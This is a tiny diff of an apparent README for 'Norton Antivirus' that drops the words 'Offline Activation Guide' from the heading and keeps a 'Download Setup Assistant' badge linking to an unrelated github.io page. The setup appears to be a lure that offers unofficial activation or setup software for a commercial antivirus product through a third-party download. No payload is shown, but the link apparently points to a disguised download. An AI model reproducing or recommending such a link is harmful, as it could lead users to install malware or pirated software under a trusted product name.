@@ -1,4 +1,4 @@
-# Norton Antivirus — Offline Activation Guide
+# Norton Antivirus 
 
 [![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/norton)
 
